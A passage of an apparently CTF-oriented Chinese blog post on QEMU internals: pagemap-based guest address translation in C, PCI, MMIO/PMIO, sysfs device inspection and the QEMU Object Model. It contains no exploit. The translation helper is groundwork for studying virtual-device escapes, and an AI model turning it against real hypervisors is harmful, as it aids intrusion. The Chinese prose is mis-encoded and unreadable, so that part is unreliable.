addr space |    |                                          |</span><br><span class="line">                   +----+------------------------------------------+</span><br><span class="line">                   |                                               |</span><br><span class="line">                    \__                Page Table                   \__</span><br><span class="line">                       \                                               \</span><br><span class="line">                        |                                               |</span><br><span class="line">                   +----+-----------------------------------------------++</span><br><span class="line">Physical memory    |    |                                               ||</span><br><span class="line">                   +----+-----------------------------------------------++</span><br></pre></td></tr></table></figure>

<p>PCIè®¾å¤‡æœ‰å…¶é…ç½®ç©ºé—´æ¥ä¿å­˜è®¾å¤‡ä¿¡æ¯ï¼Œå¤´éƒ¨æœ€å¼€å§‹çš„æ•°æ®ä¸ºDevice idå’ŒVendor id</p>
<h3 id="åœ°å€ç¿»è¯‘"><a href="#åœ°å€ç¿»è¯‘" class="headerlink" title="åœ°å€ç¿»è¯‘"></a>åœ°å€ç¿»è¯‘</h3><ol>
<li>ä»ç”¨æˆ·è™šæ‹Ÿåœ°å€åˆ°ç”¨æˆ·ç‰©ç†åœ°å€ï¼šè¿™ä¸€å±‚è½¬æ¢æ˜¯æ¨¡æ‹ŸçœŸå®è®¾å¤‡ä¸­æ‰€éœ€è¦çš„è™šæ‹Ÿåœ°å€å’Œç‰©ç†åœ°å€è€Œå­˜åœ¨çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡åˆ†æè½¬æ¢è§„åˆ™ï¼Œç¼–å†™ç¨‹åºæ¥æ¨¡æ‹Ÿè¿™ä¸€å±‚è½¬æ¢ã€‚</li>
<li>ä»ç”¨æˆ·ç‰©ç†åœ°å€åˆ° QEMU çš„è™šæ‹Ÿåœ°å€ç©ºé—´ï¼šè¿™ä¸€å±‚æ˜¯æŠŠç”¨æˆ·çš„ç‰©ç†åœ°å€è½¬æ¢ä¸º QEMU ä¸Šä½¿ç”¨ mmap ç”³è¯·å‡ºçš„åœ°å€ç©ºé—´ï¼Œè¿™éƒ¨åˆ†ç©ºé—´çš„å†…å®¹ä¸ç”¨æˆ·çš„ç‰©ç†åœ°å€é€ä¸€å¯¹åº”ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦çŸ¥é“ QEMU ä¸Šä½¿ç”¨ mmap ç”³è¯·å‡ºçš„åœ°å€ç©ºé—´çš„åˆå§‹åœ°å€ï¼Œå†åŠ ä¸Šç”¨æˆ·ç‰©ç†åœ°å€ï¼Œå°±å¯ä»¥å¾—åˆ°æ­¤åœ°å€å¯¹åº”çš„åœ¨ QEMU ä¸­çš„è™šæ‹Ÿåœ°å€ã€‚</li>
<li>è®¡ç®—</li>
</ol>
<ul>
<li>åœ¨ x64 ç³»ç»Ÿä¸Šï¼Œè™šæ‹Ÿåœ°å€ç”± page offset (bits 0-11) å’Œ page number ç»„æˆï¼Œ<code>/proc/pid/pagemap</code><a href="https://www.kernel.org/doc/html/latest/admin-guide/mm/pagemap.html">(2)</a> è¿™ä¸ªæ–‡ä»¶ä¸­å‚¨å­˜ç€æ­¤è¿›ç¨‹çš„é¡µè¡¨ï¼Œè®©ç”¨æˆ·ç©ºé—´è¿›ç¨‹å¯ä»¥æ‰¾å‡ºæ¯ä¸ªè™šæ‹Ÿé¡µé¢æ˜ å°„åˆ°å“ªä¸ªç‰©ç†å¸§ï¼ˆéœ€è¦ CAP_SYS_ADMIN æƒé™ï¼‰ï¼Œå®ƒåŒ…å«ä¸€ä¸ª 64 ä½çš„å€¼ã€‚</li>
</ul>
<ol start="4">
<li>å®ç°</li>
</ol>
<ul>
<li>å› ä¸ºè™šæ‹ŸåŒ–æŠ€æœ¯ï¼Œå­˜åœ¨Guest OS å’Œ Host OS ä¹‹åˆ†ï¼Œè¿™é‡Œæ˜¯æ±‚ Guets OS çš„ç‰©ç†åœ°å€</li>
</ul>
<p>å¦‚æœæˆ‘ä»¬åœ¨qemuè™šæ‹Ÿæœºä¸­ç”³è¯·ä¸€æ®µå†…å­˜ç©ºé—´ï¼Œæ‰¾åˆ°å®¿ä¸»æœºå†…å­˜ã€‚åŒç†å¯ä»¥æ‰¾åˆ°ç‰©ç†å†…å­˜</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SHIFT  12</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SIZE   (1 &lt;&lt; PAGE_SHIFT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PFN_PRESENT (1ull &lt;&lt; 63)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PFN_PFN     ((1ull &lt;&lt; 55) - 1)</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line"></span><br><span class="line"><span class="comment">// è·å¾—é¡µå†…åç§»å12ä½</span></span><br><span class="line"><span class="function"><span class="type">uint32_t</span> <span class="title">page_offset</span><span class="params">(<span class="type">uint32_t</span> addr)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> addr &amp; ((<span class="number">1</span> &lt;&lt; PAGE_SHIFT) - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// è™šæ‹Ÿåœ°å€è·å¾—é¡µè¡¨ page frame number</span></span><br><span class="line"><span class="function"><span class="type">uint64_t</span> <span class="title">gva_to_gfn</span><span class="params">(<span class="type">void</span> *addr)</span> </span>&#123;</span><br><span class="line">    <span class="type">uint64_t</span> pme, gfn;</span><br><span class="line">    <span class="type">size_t</span> offset;</span><br><span class="line">    offset = ((<span class="type">uintptr_t</span>)addr &gt;&gt; <span class="number">9</span>) &amp; ~<span class="number">7</span>;</span><br><span class="line">    <span class="built_in">lseek</span>(fd, offset, SEEK_SET);</span><br><span class="line">    <span class="built_in">read</span>(fd, &amp;pme, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> (!(pme &amp; PFN_PRESENT))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    gfn = pme &amp; PFN_PFN;</span><br><span class="line">    <span class="keyword">return</span> gfn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// virtual address è½¬åŒ–ä¸º phycial address</span></span><br><span class="line"><span class="function"><span class="type">uint64_t</span> <span class="title">gva_to_gpa</span><span class="params">(<span class="type">void</span> *addr)</span> </span>&#123;</span><br><span class="line">    <span class="type">uint64_t</span> gfn = <span class="built_in">gva_to_gfn</span>(addr);</span><br><span class="line">    <span class="built_in">assert</span>(gfn != <span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">return</span> (gfn &lt;&lt; PAGE_SHIFT) | <span class="built_in">page_offset</span>((<span class="type">uint64_t</span>)addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">void</span> *ptr;</span><br><span class="line">    <span class="type">uint64_t</span> ptr_mem;</span><br><span class="line"></span><br><span class="line">    fd = <span class="built_in">open</span>(<span class="string">&quot;/proc/self/pagemap&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">perror</span>(<span class="string">&quot;open&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ptr = <span class="built_in">malloc</span>(<span class="number">256</span>);</span><br><span class="line"></span><br><span class="line">    ptr_mem = <span class="built_in">gva_to_gpa</span>(ptr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Your physical address is at 0x%&quot;</span>PRIx64<span class="string">&quot;\n&quot;</span>, ptr_mem);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="PCI"><a href="#PCI" class="headerlink" title="PCI"></a>PCI</h3><p><strong>æ€»çº¿</strong>ï¼ˆbusï¼‰æ˜¯ä¸€ç§å°†å¤šä¸ªåŠŸèƒ½å•å…ƒè¿›è¡Œè¿æ¥å¹¶å…è®¸åŠŸèƒ½å•å…ƒä¹‹é—´è¿›è¡Œæ•°æ®äº¤æ¢çš„ä¸€ç§æ•°æ®é€šè·¯ï¼Œåœ¨ç°ä»£è®¡ç®—æœºä¸­é€šå¸¸é‡‡ç”¨æ€»çº¿ç»“æ„ï¼Œå³å­˜åœ¨ä¸€æ ¹ä¸»è¦çš„å…¬å…±é€šä¿¡å¹²çº¿ï¼ŒCPU åŠå„ç§è®¾å¤‡éƒ½é€šè¿‡è¿™è·Ÿæ€»çº¿è¿›è¡Œé€šä¿¡ã€‚</p>
<p>PCI å³Â <code>Peripheral Component Interconnect</code>ï¼Œæ˜¯ä¸€ç§<strong>è¿æ¥ç”µè„‘ä¸»æ¿å’Œå¤–éƒ¨è®¾å¤‡çš„æ€»çº¿æ ‡å‡†</strong>ï¼Œå…¶é€šè¿‡å¤šæ ¹ PCI bus å®Œæˆ CPU ä¸ å¤šä¸ª PCI è®¾å¤‡é—´çš„è¿æ¥ï¼Œï¼Œåœ¨ X86 ç¡¬ä»¶ä½“ç³»ç»“æ„ä¸­å‡ ä¹æ‰€æœ‰çš„è®¾å¤‡éƒ½ä»¥å„ç§å½¢å¼è¿æ¥åˆ° PCI è®¾å¤‡æ ‘ä¸Š</p>
<p>PCI æ ‡å‡†ä¸­çš„ä¸‰ä¸ªåŸºæœ¬ç»„ä»¶ï¼š</p>
<ol>
<li><strong>PCI è®¾å¤‡</strong>ï¼ˆdeviceï¼‰ï¼šç¬¦åˆ PCI æ€»çº¿æ ‡å‡†çš„è®¾å¤‡éƒ½å¯ä»¥ç§°ä¹‹ä¸º PCI è®¾å¤‡ï¼Œåœ¨ä¸€ä¸ª PCI æ€»çº¿ä¸Šå¯ä»¥åŒ…å«å¤šä¸ª PCI è®¾å¤‡</li>
<li><strong>PCI æ€»çº¿</strong>ï¼ˆbusï¼‰ï¼šç”¨ä»¥è¿æ¥å¤šä¸ª PCI è®¾å¤‡ä¸å¤šä¸ª PCI æ¡¥çš„é€šä¿¡å¹²é“</li>
<li><strong>PCI æ¡¥</strong>ï¼ˆbridgeï¼‰ï¼šæ€»çº¿ä¹‹é—´çš„<strong>è¿æ¥æ¢çº½</strong>ï¼Œä¸»è¦æœ‰ä»¥ä¸‹ä¸‰ç§ï¼š</li>
</ol>
<ul>
<li>HOST&#x2F;PCI æ¡¥ï¼šä¹Ÿç§°ä¸º PCI ä¸»æ¡¥æˆ–è€… PCI æ€»çº¿æ§åˆ¶å™¨ï¼Œç”¨ä»¥è¿æ¥ CPU ä¸ PCI æ ¹æ€»çº¿ï¼Œ<strong>éš”ç¦»è®¾å¤‡åœ°å€ç©ºé—´ä¸å­˜å‚¨å™¨åœ°å€ç©ºé—´</strong>ï¼Œç°ä»£ PC é€šå¸¸è¿˜ä¼šåœ¨å…¶ä¸­é›†æˆå†…å­˜æ§åˆ¶å™¨ï¼Œç§°ä¹‹ä¸º<strong>åŒ—æ¡¥èŠ¯ç‰‡ç»„</strong>ï¼ˆNorth Bridge Chipsetï¼‰</li>
<li>PCI&#x2F;ISA æ¡¥ï¼šç”¨äºè¿æ¥æ—§çš„ ISA æ€»çº¿ï¼Œé€šå¸¸è¿˜ä¼šé›†æˆä¸­æ–­æ§åˆ¶å™¨ï¼ˆå¦‚ i8359Aï¼‰ï¼Œç§°ä¹‹ä¸º<strong>å—æ¡¥èŠ¯ç‰‡ç»„</strong>ï¼ˆSouth Bridge Chipsetï¼‰</li>
<li>PCI-to-PCI æ¡¥ï¼šç”¨äºè¿æ¥ PCI ä¸»æ€»çº¿ï¼ˆPrimary Busï¼‰ä¸æ¬¡æ€»çº¿ï¼ˆSecondary Busï¼‰</li>
</ul>
<h4 id="mmio-memory-mapped-io"><a href="#mmio-memory-mapped-io" class="headerlink" title="mmio : memory mapped io"></a>mmio : memory mapped io</h4><p>å†…å­˜æ˜ å°„ IOã€‚è¿™ç§æ–¹å¼å°† IO è®¾å¤‡çš„å†…å­˜ä¸å¯„å­˜å™¨æ˜ å°„åˆ°æŒ‡å®šçš„å†…å­˜åœ°å€ç©ºé—´ä¸Šï¼Œæ­¤æ—¶æˆ‘ä»¬ä¾¿å¯ä»¥é€šè¿‡å¸¸è§„çš„è®¿é—®å†…å­˜çš„æ–¹å¼æ¥ç›´æ¥è®¿é—®åˆ°è®¾å¤‡çš„å¯„å­˜å™¨ä¸å†…å­˜</p>
<h4 id="pmio-port-mapped-io"><a href="#pmio-port-mapped-io" class="headerlink" title="pmio : port mapped io"></a>pmio : port mapped io</h4><p>ç«¯å£æ˜ å°„ IOã€‚è¿™ç§æ–¹å¼å°† IO è®¾å¤‡çš„å¯„å­˜å™¨ç¼–ç åˆ°æŒ‡å®šçš„ç«¯å£ä¸Šï¼Œæˆ‘ä»¬éœ€è¦é€šè¿‡è®¿é—®ç«¯å£çš„æ–¹å¼æ¥è®¿é—®è®¾å¤‡çš„å¯„å­˜å™¨ä¸å†…å­˜ï¼ˆä¾‹å¦‚åœ¨ x86 ä¸‹é€šè¿‡Â <code>in</code>Â ä¸Â <code>out</code>Â è¿™ä¸€ç±»çš„æŒ‡ä»¤å¯ä»¥è¯»å†™ç«¯å£ï¼‰ã€‚IO è®¾å¤‡é€šè¿‡ä¸“ç”¨çš„é’ˆè„šæˆ–è€…ä¸“ç”¨çš„æ€»çº¿ä¸ CPU è¿æ¥ï¼Œè¿™ä¸å†…å­˜åœ°å€ç©ºé—´ç›¸ç‹¬ç«‹ï¼Œå› æ­¤åˆç§°ä½œ isolated I&#x2F;O</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// b: byte</span></span><br><span class="line"><span class="comment">// w: word 2 byte</span></span><br><span class="line"><span class="comment">// l: long 4 byte</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">char</span> <span class="title">inb</span><span class="params">(<span class="type">unsigned</span> <span class="type">short</span> port)</span></span>;</span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">short</span> <span class="title">inw</span><span class="params">(<span class="type">unsigned</span> <span class="type">short</span> port)</span></span>;</span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span> <span class="title">inl</span><span class="params">(<span class="type">unsigned</span> <span class="type">short</span> port)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">outb</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> value, <span class="type">unsigned</span> <span class="type">short</span> port)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">outw</span><span class="params">(<span class="type">unsigned</span> <span class="type">short</span> value, <span class="type">unsigned</span> <span class="type">short</span> port)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">outl</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> value, <span class="type">unsigned</span> <span class="type">short</span> port)</span></span>;</span><br></pre></td></tr></table></figure>

<h4 id="æŸ¥çœ‹ç³»ç»Ÿpciè®¾å¤‡"><a href="#æŸ¥çœ‹ç³»ç»Ÿpciè®¾å¤‡" class="headerlink" title="æŸ¥çœ‹ç³»ç»Ÿpciè®¾å¤‡"></a>æŸ¥çœ‹ç³»ç»Ÿpciè®¾å¤‡</h4><p><a href="https://www.kernel.org/doc/html/next/translations/zh_CN/PCI/sysfs-pci.html">é€šè¿‡sysfsè®¿é—®PCIè®¾å¤‡èµ„æº</a></p>
<p>PCI è®¾å¤‡é€šè¿‡ <code>PCIbridge classcode: deviceid:vendorid</code> åŒºåˆ†ã€‚ä½†æ˜¯åœ¨çœŸå®è®¾å¤‡ä¸­çš„ä¿¡æ¯æ›´å¤š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">~ <span class="comment"># lspci -v</span></span><br><span class="line">00:01.0 Class 0601: 8086:7000</span><br><span class="line">00:04.0 Class 00ff: 1234:2024</span><br><span class="line">00:00.0 Class 0600: 8086:1237</span><br><span class="line">00:01.3 Class 0680: 8086:7113</span><br><span class="line">00:03.0 Class 0200: 8086:100e</span><br><span class="line">00:01.1 Class 0101: 8086:7010</span><br><span class="line">00:02.0 Class 0300: 1234:1111</span><br></pre></td></tr></table></figure>


<p><code>resource0</code>å¯¹åº”çš„æ˜¯MMIOï¼Œè€Œ<code>resource1</code>å¯¹åº”çš„æ˜¯PMIOï¼ˆä¸º0åˆ™ä»£è¡¨æ²¡æœ‰ã€‚<code>resource</code>ä¸­æ•°æ®æ ¼å¼æ˜¯<code>start-address end-address flags</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">~ <span class="comment"># cat /sys/devices/pci0000:00/0000:00:03.0/resource</span></span><br><span class="line">0x00000000febc0000 0x00000000febdffff 0x0000000000040200</span><br><span class="line">0x000000000000c000 0x000000000000c03f 0x0000000000040101</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>é€šè¿‡æŸ¥çœ‹å…¶<code>config</code>æ–‡ä»¶æ¥æŸ¥çœ‹è®¾å¤‡çš„é…ç½®ç©ºé—´ï¼Œæ•°æ®éƒ½å¯ä»¥åŒ¹é…ä¸Š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">~ # hexdump -C  /sys/devices/pci0000:00/0000:00:04.0/config </span><br><span class="line">00000000  34 12 24 20 03 01 00 00  10 00 ff 00 00 00 00 00  |4.$ ............|</span><br><span class="line">00000010  00 10 bf fe 00 00 00 00  00 00 00 00 00 00 00 00  |................|</span><br><span class="line">00000020  00 00 00 00 00 00 00 00  00 00 00 00 f4 1a 00 11  |................|</span><br><span class="line">00000030  00 00 00 00 00 00 00 00  00 00 00 00 0b 01 00 00  |................|</span><br><span class="line">00000040  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|</span><br><span class="line">*</span><br><span class="line">00000100</span><br></pre></td></tr></table></figure>

<h3 id="Qemu-Object-Model"><a href="#Qemu-Object-Model" class="headerlink" title="Qemu Object Model"></a>Qemu Object Model</h3><p>Qemu æ˜¯ä½¿ç”¨ C ç¼–å†™çš„ï¼Œä½†æ˜¯å……æ»¡äº† OOP çš„æ€æƒ³ï¼Œåœ¨ Qemu å½“ä¸­æœ‰ç€ä¸€å¥—å«åšÂ <strong>Qemu Object Model</strong><a href="https://github.com/qemu/qemu/blob/master/include/qom/object.h">(3)</a>Â çš„ä¸œè¥¿æ¥å®ç°é¢å‘å¯¹è±¡</p>
<p>åœ¨ QOM å½“ä¸­ä½¿ç”¨æˆå‘˜åµŒå¥—çš„æ–¹å¼æ¥å®Œæˆç±»çš„ç»§æ‰¿ï¼Œçˆ¶ç±»ä½œä¸ºç±»ç»“æ„ä½“çš„ç¬¬ä¸€ä¸ªæˆå‘˜Â <code>parent</code>Â è€Œå­˜åœ¨ï¼Œä¸æ”¯æŒå¤šç»§æ‰¿</p>
<ul>
<li><code>Type</code>ï¼šç”¨æ¥å®šä¹‰ä¸€ä¸ªã€Œç±»ã€çš„åŸºæœ¬å±æ€§ï¼Œä¾‹å¦‚ç±»çš„åå­—ã€å¤§å°ã€æ„é€ å‡½æ•°ç­‰</li>
<li><code>Class</code>ï¼šç”¨æ¥å®šä¹‰ä¸€ä¸ªã€Œç±»ã€çš„é™æ€å†…å®¹ï¼Œä¾‹å¦‚ç±»ä¸­å­˜å‚¨çš„é™æ€æ•°æ®ã€æ–¹æ³•å‡½æ•°æŒ‡é’ˆç­‰</li>
<li><code>Object</code>ï¼šåŠ¨æ€åˆ†é…çš„ä¸€ä¸ªã€Œç±»ã€çš„å…·ä½“çš„å®ä¾‹ï¼ˆinstanceï¼‰ï¼Œå‚¨å­˜ç±»çš„åŠ¨æ€æ•°æ®</li>
<li><code>Property</code>ï¼šåŠ¨æ€å¯¹è±¡æ•°æ®çš„è®¿é—®å™¨ï¼ˆaccessorï¼‰ï¼Œå¯ä»¥é€šè¿‡ç›‘è§†å™¨æ¥å£è¿›è¡Œæ£€æŸ¥</li>
</ul>
<p>åœ¨åˆå§‹åŒ–è®¾å¤‡æ—¶ä¼šåˆå§‹åŒ–å››ä¸ªæ¯”è¾ƒé‡è¦çš„ç»“æ„ä½“ï¼šTypeInfo -&gt; TypeImpl -&gt; ObjectClass -&gt; Objectï¼Œæ¯ä¸ª Objectå¯¹åº”ä¸€ä¸ªå…·ä½“çš„deviceï¼Œå…¶æ„é€ å‡½æ•°åœ¨qemuå¯åŠ¨ç”¨<code>-device</code>å‚æ•°åŠ è½½è®¾å¤‡æ—¶è°ƒç”¨</p>
<h3 id="hw-misc-edu-c"><a href="#hw-misc-edu-c" class="headerlink" title="hw&#x2F;misc&#x2F;edu.c"></a>hw&#x2F;misc&#x2F;edu.c</h3><p>ç»“åˆ<a href="https://ctf-wiki.org/pwn/virtualization/qemu/environment/build-qemu-dev/">CTF Wiki</a>å†…å®¹ã€<a href="https://elixir.bootlin.com/qemu/v8.1.4/source">Qemu source code</a>å’Œæ–‡æ¡£<a href="https://www.qemu.org/docs/master/devel/qom.html">QEMU documentation</a></p>
<p>æ¦‚å¿µ</p>
<ul>
<li>opaque: è¡¨ç¤ºä¸é€æ˜çš„è®¾å¤‡</li>
<li>State: è™šæ‹Ÿè®¾å¤‡</li>
</ul>
<h4 id="TypeInfo-å®šä¹‰è®¾å¤‡"><a href="#TypeInfo-å®šä¹‰è®¾å¤‡" class="headerlink" title="TypeInfo: å®šä¹‰è®¾å¤‡"></a>TypeInfo: å®šä¹‰è®¾å¤‡</h4><p>qemuä¸­æ³¨å†Œçš„æ¯ä¸ªè®¾å¤‡éƒ½ç”±ä¸€ä¸ªTypeInfoç±»å‹æ¥å®šä¹‰ã€‚</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">TypeInfo</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *name;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *parent;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> instance_size;</span><br><span class="line">    <span class="built_in">void</span> (*instance_init)(Object *obj);</span><br><span class="line">    <span class="built_in">void</span> (*instance_post_init)(Object *obj);</span><br><span class="line">    <span class="built_in">void</span> (*instance_finalize)(Object *obj);</span><br><span class="line"></span><br><span class="line">    <span class="type">bool</span> abstract;</span><br><span class="line">    <span class="type">size_t</span> class_size;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">void</span> (*class_init)(ObjectClass *klass, <span class="type">void</span> *data);</span><br><span class="line">    <span class="built_in">void</span> (*class_base_init)(ObjectClass *klass, <span class="type">void</span> *data);</span><br><span class="line">    <span class="built_in">void</span> (*class_finalize)(ObjectClass *klass, <span class="type">void</span> *data);</span><br><span class="line">    <span class="type">void</span> *class_data;</span><br><span class="line"></span><br><span class="line">    InterfaceInfo *interfaces;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>æ¯”å¦‚åœ¨eduä¸­çš„å®šä¹‰</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">pci_edu_register_types</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">static</span> InterfaceInfo interfaces[] = &#123;</span><br><span class="line">        &#123; INTERFACE_CONVENTIONAL_PCI_DEVICE &#125;,</span><br><span class="line">        &#123; &#125;,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">static</span> <span class="type">const</span> TypeInfo edu_info = &#123;</span><br><span class="line">        .name          = TYPE_PCI_EDU_DEVICE,</span><br><span class="line">        .parent        = TYPE_PCI_DEVICE,</span><br><span class="line">        .instance_size = <span class="built_in">sizeof</span>(EduState),</span><br><span class="line">        .instance_init = edu_instance_init,</span><br><span class="line">        .class_init    = edu_class_init,</span><br><span class="line">        .interfaces = interfaces,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">type_register_static</span>(&amp;edu_info);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å®šä¹‰äº†è®¾å¤‡ç±»å‹åï¼Œéœ€è¦åšçš„æ˜¯æ³¨å†Œè¿™ä¸ªç±»å‹ã€‚æ‰§è¡Œç±»å‹æ³¨å†Œå‡½æ•°type_register()</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">type_register_static</span>(&amp;edu_info);</span><br></pre></td></tr></table></figure>

<p>æ„é€ å‡½æ•°ã€‚</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">type_init</span>(pci_edu_register_types)</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> type_init(function) module_init(function, MODULE_INIT_QOM)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> module_init(function, type)                                         \</span></span><br><span class="line"><span class="meta">static void __attribute__((constructor)) do_qemu_init_ ## function(void)    \</span></span><br><span class="line"><span class="meta">&#123;                                                                           \</span></span><br><span class="line"><span class="meta">    register_module_init(function, type);                                   \</span></span><br><span class="line"><span class="meta">&#125;</span></span><br></pre></td></tr></table></figure>

<h4 id="class-å®ä¾‹åŒ–è®¾å¤‡"><a href="#class-å®ä¾‹åŒ–è®¾å¤‡" class="headerlink" title="class: å®ä¾‹åŒ–è®¾å¤‡"></a>class: å®ä¾‹åŒ–è®¾å¤‡</h4><p>type_rigister æ‰§è¡Œå: ä½¿ç”¨ TypeInfo ç”Ÿæˆä¸€ä¸ª <code>TypeImpl</code>ï¼Œä¼šå‘ç°æˆå‘˜å˜é‡å‡ ä¹ç›¸åŒï¼Œå®é™…ä¸Šqemuå°±æ˜¯é€šè¿‡ç”¨æˆ·æä¾›çš„TypeInfoåˆ›å»ºçš„TypeImplçš„å¯¹è±¡ã€‚</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">TypeImpl</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *name;</span><br><span class="line">    <span class="type">size_t</span> class_size;</span><br><span class="line">    <span class="type">size_t</span> instance_size;</span><br><span class="line">    <span class="type">size_t</span> instance_align;</span><br><span class="line">    <span class="built_in">void</span> (*class_init)(ObjectClass *klass, <span class="type">void</span> *data);</span><br><span class="line">    <span class="built_in">void</span> (*class_base_init)(ObjectClass *klass, <span class="type">void</span> *data);</span><br><span class="line">    <span class="type">void</span> *class_data;</span><br><span class="line">    <span class="built_in">void</span> (*instance_init)(Object *obj);</span><br><span class="line">    <span class="built_in">void</span> (*instance_post_init)(Object *obj);</span><br><span class="line">    <span class="built_in">void</span> (*instance_finalize)(Object *obj);</span><br><span class="line">    <span class="type">bool</span> abstract;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *parent;</span><br><span class="line">    TypeImpl *parent_type;</span><br><span class="line">    ObjectClass *<span class="keyword">class</span>;                        <span class="comment">//æŒ‡å‘ ObjectClass çš„æŒ‡é’ˆ</span></span><br><span class="line">    <span class="type">int</span> num_interfaces;</span><br><span class="line">    InterfaceImpl interfaces[MAX_INTERFACES];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>æ³¨å†Œç±»å‹TypeImplä¹‹åå°±éœ€è¦åˆå§‹åŒ–è¯¥ç±»å‹ï¼Œå…¶ä¸­æœ‰ä¸ªå«classçš„æˆå‘˜ã€‚åˆå§‹åŒ–å…¶å®å°±æ˜¯åˆå§‹åŒ–çš„å®ƒã€‚å½“æ‰€æœ‰qemuæ€»çº¿ã€è®¾å¤‡ç­‰çš„type_register_staticæ‰§è¡Œå®Œæˆåï¼Œå³å®ƒä»¬çš„TypeImplå®ä¾‹åˆ›å»ºæˆåŠŸåï¼Œqemuå°±ä¼šåœ¨type_initializeå‡½æ•°ä¸­å»å®ä¾‹åŒ–å…¶å¯¹åº”çš„ObjectClasses</p>
<p>ObjectClassæ˜¯æ‰€æœ‰classçš„åŸºç±»</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">ObjectClass</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* private: */</span></span><br><span class="line">    Type type;</span><br><span class="line">    GSList *interfaces;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *object_cast_cache[OBJECT_CLASS_CAST_CACHE];</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *class_cast_cache[OBJECT_CLASS_CAST_CACHE];</span><br><span class="line">    ObjectUnparent *unparent;</span><br><span class="line">    GHashTable *properties;</span><br><span 